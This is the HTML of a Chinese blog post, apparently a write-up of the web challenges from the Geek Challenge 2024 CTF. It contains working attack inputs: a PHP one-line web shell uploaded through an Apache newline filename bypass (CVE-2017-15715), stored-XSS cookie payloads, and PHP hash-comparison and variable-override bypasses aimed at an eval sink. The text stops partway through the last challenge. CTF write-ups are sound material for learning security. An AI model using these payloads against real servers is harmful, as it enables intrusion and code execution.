@@ -1,0 +1,240 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>极客大挑战2024wp--web | root@wanth3f1ag</title><meta name="author" content="wanTh3flag"><meta name="copyright" content="wanTh3flag"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x01前言极客2024没来得及比赛就结束了，所以下面的都是后面复现去做的 0x02赛题baby_uploadhint:Parar说他的黑名单无懈可击，GSBP师傅只花了十分钟就拿下了他的权限，你看看怎么绕过呢  先上传一个php文件看看  有过滤，把文件内容删掉后测试发现存在后缀名验证，先看看能不能绕过这个，后面我随便上传一个图片都显示上传失败，有点神奇 换个思路，先随便在url中传入一个路径">
+<meta property="og:type" content="article">
+<meta property="og:title" content="极客大挑战2024wp--web">
+<meta property="og:url" content="http://example.com/2025/03/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024wp-web/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="0x01前言极客2024没来得及比赛就结束了，所以下面的都是后面复现去做的 0x02赛题baby_uploadhint:Parar说他的黑名单无懈可击，GSBP师傅只花了十分钟就拿下了他的权限，你看看怎么绕过呢  先上传一个php文件看看  有过滤，把文件内容删掉后测试发现存在后缀名验证，先看看能不能绕过这个，后面我随便上传一个图片都显示上传失败，有点神奇 换个思路，先随便在url中传入一个路径">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/8.jpg">
+<meta property="article:published_time" content="2025-03-25T07:07:48.000Z">
+<meta property="article:modified_time" content="2025-03-25T03:48:28.308Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="极客大挑战2024">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/8.jpg"><link rel="shortcut icon" href="/image/avatar.jpg"><link rel="canonical" href="http://example.com/2025/03/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024wp-web/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '极客大挑战2024wp--web',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-25 11:48:28',
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(/image/8.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-circle"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">root@wanth3f1ag</span></a><a class="nav-page-title" href="/"><span class="site-name">极客大挑战2024wp--web</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-circle"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">极客大挑战2024wp--web</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-25T07:07:48.000Z" title="发表于 2025-03-25 15:07:48">2025-03-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-25T03:48:28.308Z" title="更新于 2025-03-25 11:48:28">2025-03-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%B5%9B%E9%A2%98wp/">赛题wp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>极客2024没来得及比赛就结束了，所以下面的都是后面复现去做的</p>
+<h1 id="0x02赛题"><a href="#0x02赛题" class="headerlink" title="0x02赛题"></a>0x02赛题</h1><h1 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h1><p>hint:Parar说他的黑名单无懈可击，GSBP师傅只花了十分钟就拿下了他的权限，你看看怎么绕过呢</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/image-20241125151101143.png" alt="image-20241125151101143"></p>
+<p>先上传一个php文件看看</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/image-20250325093558530.png" alt="image-20250325093558530"></p>
+<p>有过滤，把文件内容删掉后测试发现存在后缀名验证，先看看能不能绕过这个，后面我随便上传一个图片都显示上传失败，有点神奇</p>
+<p>换个思路，先随便在url中传入一个路径</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/image-20250325094724950.png" alt="image-20250325094724950"></p>
+<p>版本apache2.4.10，CVE-2017-15715,然后当时就复现了一下写在另一篇文章了，这里直接给payload</p>
+<p>先上传我们的一句话木马然后抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/2</span><br><span class="line">Host: 80-74c251eb-096f-471b-ac79-241c6f54f8bc.challenge.ctfplus.cn</span><br><span class="line">Cookie: _ga=GA1.1.143187499.1742196271; _clck=1553zmg%7C2%7Cfui%7C0%7C1902; _ga_BFDVYZJ3DE=GS1.1.1742866027.5.1.1742866306.0.0.0</span><br><span class="line">Content-Length: 420</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;134&quot;, &quot;Not:A-Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;134&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Origin: https://80-74c251eb-096f-471b-ac79-241c6f54f8bc.challenge.ctfplus.cn</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCrce63X7dVz32SvP</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://80-74c251eb-096f-471b-ac79-241c6f54f8bc.challenge.ctfplus.cn/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryCrce63X7dVz32SvP</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br><span class="line">------WebKitFormBoundaryCrce63X7dVz32SvP</span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">1.php</span><br><span class="line">------WebKitFormBoundaryCrce63X7dVz32SvP</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundaryCrce63X7dVz32SvP--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>name的值是我自己设置的1.php，然后在1.php后加上0a</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/image-20250325102404387.png" alt="image-20250325102404387"></p>
+<p>上传返回uploads&#x2F;1.php路径，我们访问uploads&#x2F;1.php%0a能访问出来，蚁剑连接拿flag</p>
+<h1 id="Problem-On-My-Web"><a href="#Problem-On-My-Web" class="headerlink" title="Problem_On_My_Web"></a>Problem_On_My_Web</h1><p>starven师傅想要向他的女神表白，所以他专门写了个表白墙用来写他的甜言蜜语，你能看看他的表白墙有什么问题吗</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/image-20250325103258392.png" alt="image-20250325103258392"></p>
+<p>看到url里的参数去测试了一下发现漏洞点不在这</p>
+<p>然后在&#x2F;manager路径下有一个提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If you could tell me where my website has a problem,i would give you a gift in my cookies!!! [Post url=]</span><br></pre></td></tr></table></figure>
+
+<p>post传参url&#x3D;]提示Your host must be 127.0.0.1 and can be visit，但是修改请求头后没打通</p>
+<p>在&#x2F;forms看到有留言板，打xss测试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>一开始没看到有弹窗，然后把网页关掉重新开就有了，重新开靶机打xss</p>
+<p>根据刚刚的那个提示，尝试把cookie带出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后在&#x2F;manager路径post</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>传这个之后应该就会有管理员去触发我们的xss</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/image-20250325110835015.png" alt="image-20250325110835015"></p>
+<h1 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h1><p>Just rce me</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Can you RCE me?</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/start.*now/is&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>], <span class="string">&quot;start now&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Well, you haven&#x27;t started.&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome to GeekChallenge2024!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    <span class="title function_ invoke__">sha1</span>((<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span>) &amp;&amp;</span><br><span class="line">    (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>] != <span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]))</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You took the first step!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$year</span>) &lt; <span class="number">2024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$year</span> + <span class="number">1</span>) &gt; <span class="number">2025</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Well, I know the year is 2024&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.+?rce/ism&quot;</span>, <span class="variable">$purpose</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$purpose</span>, <span class="string">&quot;rce&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Get the flag now!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;It is not enough to stop you!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;It is so easy, do you know sha1 and md5?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Well, you haven<span class="string">&#x27;t started.</span></span><br></pre></td></tr></table></figure>
+
+<p>按照代码先post传一个start&#x3D;start now进行下面的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    <span class="title function_ invoke__">sha1</span>((<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span>) &amp;&amp;</span><br><span class="line">    (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>] != <span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]))</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>将Geekchallenge2024_bmKtL进行md5加密后发现值为0e开头的0e073277003087724660601042042394，这里就是强碰撞了，但是要求我们传入纯数字的__2024.geekchallenge.ctf，那我们就直接找sha1加密后是0e开头的看看里面有没有纯数字的值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10932435112</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;right&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//right</span></span><br></pre></td></tr></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120973888">https://blog.csdn.net/cosmoslin/article/details/120973888</a></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start=start now&amp;__2024.geekchallenge.ctf=10932435112</span><br></pre></td></tr></table></figure>
+
+<p>一开始没成功，后面仔细看发现是非法变量的问题，用[去绕过就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start=start now&amp;_[2024.geekchallenge.ctf=10932435112</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/image-20250325112941629.png" alt="image-20250325112941629"></p>
+<p>继续下一层</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$year</span>) &lt; <span class="number">2024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$year</span> + <span class="number">1</span>) &gt; <span class="number">2025</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Well, I know the year is 2024&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.+?rce/ism&quot;</span>, <span class="variable">$purpose</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$purpose</span>, <span class="string">&quot;rce&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Get the flag now!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>$$下的动态变量，进行<strong>变量覆盖</strong></p>
+<p>可以创建后续要用的 $year $purpose $code</p>
+<h2 id="intval-的截断特性"><a href="#intval-的截断特性" class="headerlink" title="intval() 的截断特性"></a>intval() 的截断特性</h2><ul>
+<li><code>intval()</code> 函数会将字符串转换为整数，但会截断非数字部分。，例如我们传入2023e1经过处理后就是2023</li>
+</ul>
+<p>所以我们传入year&#x3D;2023e1</p>
